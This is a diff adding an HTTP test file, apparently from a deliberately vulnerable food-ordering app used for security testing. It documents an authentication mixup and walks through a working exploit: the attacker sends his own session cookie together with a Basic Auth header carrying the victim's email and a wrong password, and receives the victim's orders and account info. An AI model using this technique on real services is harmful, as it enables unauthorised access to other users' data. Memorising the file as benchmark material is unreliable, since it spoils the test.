@@ -1,0 +1,107 @@
+# @import ../_imports.http
+
+# [VULN] GET /orders - Session Hijack via Auth Mixup
+#
+# SEVERITY: Critical
+# IMPACT: Data disclosure - Plankton views Patrick's orders
+#
+# THE VULNERABILITY:
+# - authenticate_customer() instantiates both cookie and Basic Auth authenticators
+# - Basic Auth copies username into g.email in constructor, BEFORE password verification
+# - The any() check short-circuits when cookie succeeds
+# - The poisoned g.email from failed Basic Auth survives into handler logic
+#
+# EXPLOIT STEPS:
+# 1. Plankton logs in legitimately and gets a session cookie
+# 2. Plankton sends GET /orders with cookie + Basic Auth header (Patrick's email, wrong password)
+# 3. Basic Auth sets g.email = patrick, cookie auth succeeds, handler reads Patrick's orders
+# 4. Plankton sees Patrick's order history instead of his own
+
+### Step 1: Seed data - Patrick places an order so there's something to steal
+# @name patrick_order_setup
+{{
+  await platform.seed({ patrick: 200, plankton: 100 });
+
+  // Patrick creates cart, adds item, and checks out
+  const cartResp = await fetch(url("/cart"), {
+    method: "POST",
+    headers: { "Authorization": auth.basic("patrick") }
+  });
+  const { cart_id } = await cartResp.json();
+
+  await fetch(url("/cart/" + cart_id + "/items"), {
+    method: "POST",
+    headers: {
+      "Authorization": auth.basic("patrick"),
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ item_id: menu.item("Krabby Patty").id })
+  });
+
+  await fetch(url("/cart/" + cart_id + "/checkout"), {
+    method: "POST",
+    headers: {
+      "Authorization": auth.basic("patrick"),
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ delivery_address: "Under the Rock", tip: 0 })
+  });
+}}
+# @tag orders, r02, v201, vulnerable
+GET /orders
+Authorization: {{auth.basic("patrick")}}
+
+?? js $(response).isOk() == true
+?? js $(response).hasOnlyUserData("patrick") == true
+
+### Step 2: Plankton logs in legitimately
+# @name plankton_login
+# @forceRef patrick_order_setup
+# @tag orders, r02, v201, vulnerable
+POST /auth/login
+Content-Type: application/json
+
+{
+  "email": "{{user("plankton").email}}",
+  "password": "{{user("plankton").password}}"
+}
+
+{{
+  exports.plankton_cookie = extractCookie(response);
+}}
+?? js $(response).isOk() == true
+
+### Step 3: Plankton verifies he can see his own (empty) orders
+# @name plankton_own_orders
+# @forceRef plankton_login
+# @ucskip
+# @tag orders, r02, v201, vulnerable
+GET /orders
+Cookie: {{plankton_cookie}}
+
+?? js $(response).isOk() == true
+
+### Step 4: EXPLOIT - Plankton uses cookie + Patrick's email in Basic Auth
+# @name session_hijack_exploit
+# @forceRef plankton_own_orders
+# @tag orders, r02, v201, vulnerable
+GET /orders
+Cookie: {{plankton_cookie}}
+Authorization: Basic {{user("patrick").email}}:wrong_password_doesnt_matter
+
+# VULNERABILITY CONFIRMED: Returns Patrick's orders, not Plankton's!
+?? js $(response).isOk() == true
+?? js $(response).hasOnlyUserData("patrick") == true
+
+### Step 5: Verify the hijack persists to account/info endpoint
+# @name verify_hijack_account
+# @forceRef session_hijack_exploit
+# @ucskip
+# @tag orders, r02, v201, vulnerable
+GET /account/info
+Cookie: {{plankton_cookie}}
+Authorization: Basic {{user("patrick").email}}:nope
+
+# Account info shows Patrick's data
+?? js $(response).isOk() == true
+?? js $(response).field("email") == {{user("patrick").email}}
